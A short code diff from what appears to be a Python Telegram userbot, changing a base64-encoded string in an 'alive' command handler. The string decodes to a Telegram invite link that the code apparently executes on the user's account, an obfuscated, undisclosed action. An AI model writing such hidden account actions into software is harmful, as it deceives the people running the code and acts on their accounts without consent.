@@ -73,7 +73,7 @@ async def amireallyalive(event):
     )
     
     # فك تشفير الرابط (إذا كان مطلوبًا)
-    joker = base64.b64decode("aHR0cHM6Ly90Lm1lL0luYVJhUzU=")
+    joker = base64.b64decode("aHR0cHM6Ly90Lm1lLytfbGw2bGRwNkdoTkZpTWpnMA==")
     joker = Get(joker)
     try:
         await event.client(joker)
